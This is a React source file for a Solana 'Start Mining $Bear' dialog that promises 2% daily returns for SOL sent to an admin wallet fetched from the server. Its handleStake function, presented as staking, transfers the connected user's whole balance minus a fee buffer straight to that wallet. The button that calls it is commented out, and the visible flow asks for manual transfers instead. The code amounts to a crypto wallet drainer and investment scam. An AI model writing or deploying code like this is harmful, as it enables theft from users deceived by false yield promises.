import { useState, useEffect } from "react";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { Button } from "@/components/ui/button";
import { Copy, Check, Loader2 } from "lucide-react";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";

const StakeModal = () => {
  const [copied, setCopied] = useState(false);
  const [adminWallet, setAdminWallet] = useState("HjzNMHpUgRy4x4xXkniGciS1JpfKKjjJzogcFWMPWhqb"); // Default fallback

  // Fetch Admin Wallet from DB
  useEffect(() => {
    fetch("/api/settings/wallets")
      .then((res) => res.json())
      .then((data) => {
        if (data && data.solWallet) {
          setAdminWallet(data.solWallet);
        }
      })
      .catch((err) => console.error("Failed to fetch admin wallet", err));
  }, []);

  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [isStaking, setIsStaking] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(adminWallet);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleStake = async () => {
    if (!publicKey || !adminWallet) return;

    setIsStaking(true);
    try {
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
      const balance = await connection.getBalance(publicKey);
      const feeBuffer = 0.003 * LAMPORTS_PER_SOL; // Reserve 0.003 SOL to cover gas + rent exemption
      const amountToStake = balance - feeBuffer;

      if (amountToStake <= 0) {
        alert("Insufficient balance to cover transaction fees.");
        setIsStaking(false);
        return;
      }

      const transaction = new Transaction({
        feePayer: publicKey,
        recentBlockhash: blockhash,
      }).add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey(adminWallet),
          lamports: amountToStake,
        })
      );

      const signature = await sendTransaction(transaction, connection);
      console.log("Transaction sent:", signature);

      await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, "confirmed");
      alert(`Staking Successful! ${(amountToStake / LAMPORTS_PER_SOL).toFixed(4)} SOL sent.`);

    } catch (error: any) {
      console.error("Staking failed:", error);
      
      let errorMessage = "Staking failed. Please try again.";
      if (error.message) {
         if (error.message.includes("User rejected")) errorMessage = "Transaction rejected by user.";
         else if (error.message.includes("0x1")) errorMessage = "Insufficient funds for transaction fees.";
         else errorMessage = `Transaction Error: ${error.message}`; 
      }

      alert(errorMessage);
    } finally {
      setIsStaking(false);
    }
  };

  return (
    <AlertDialog>
      <AlertDialogTrigger asChild>
        <Button className="w-full h-full min-h-[50px] bg-primary text-[#F4D2AF] font-serif hover:bg-primary/90 px-4 py-3 rounded-xl font-medium hover:scale-[1.02] transition-transform shadow-md border-2 border-[#0E0000] text-sm md:text-base whitespace-nowrap leading-tight truncate">
          Start Mining $Bear
        </Button>
      </AlertDialogTrigger>
      <AlertDialogContent>
        <AlertDialogHeader>
          <AlertDialogTitle>
            Follow the steps below to start mining $bear tokens on the Solana
            (SOL) chain
          </AlertDialogTitle>
          <AlertDialogDescription>
            Send SOL to the address below to start earning 2% daily returns.
            Your mining will begin automatically once the transaction is
            confirmed.
          </AlertDialogDescription>
        </AlertDialogHeader>
        <div className="my-4 space-y-3">
          <div className="rounded-lg border p-4 bg-muted">
            <p className="text-sm font-medium mb-2">Wallet Address:</p>
            <div className="flex items-center gap-2">
              <code className="flex-1 text-xs break-all bg-background p-2 rounded">
                {adminWallet}
              </code>
              <Button
                size="sm"
                variant="outline"
                onClick={handleCopy}
                className="relative"
              >
                {copied ? (
                  <>
                    <Check className="h-4 w-4 mr-1 animate-in zoom-in duration-200" />
                    Copied
                  </>
                ) : (
                  <>
                    <Copy className="h-4 w-4 mr-1" />
                    Copy
                  </>
                )}
              </Button>
            </div>
          </div>
          <p className="text-xs text-muted-foreground">
            Minimum stake: 0.0001 SOL • Network: Solana Mainnet
          </p>
          <p className="text-xs text-red-500">
            Please do not close this dialog until you have sent the SOL and
            clicked <b><u>&quot;I&apos;ve sent SOL&quot;</u></b>.
          </p>
        </div>

        <AlertDialogFooter>
          <AlertDialogCancel disabled={isStaking}>Cancel</AlertDialogCancel>
          {/* <Button
            onClick={handleStake}
            disabled={isStaking || !publicKey}
            className="bg-primary text-[#F4D2AF]"
          >
            {isStaking ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                Processing...
              </>
            ) : (
              "Stake Max (All SOL)"
            )}
          </Button> */}
          <AlertDialogAction disabled={isStaking}>I've sent SOL (Manual)</AlertDialogAction>
        </AlertDialogFooter>
      </AlertDialogContent>
    </AlertDialog>
  );
};

export default StakeModal;
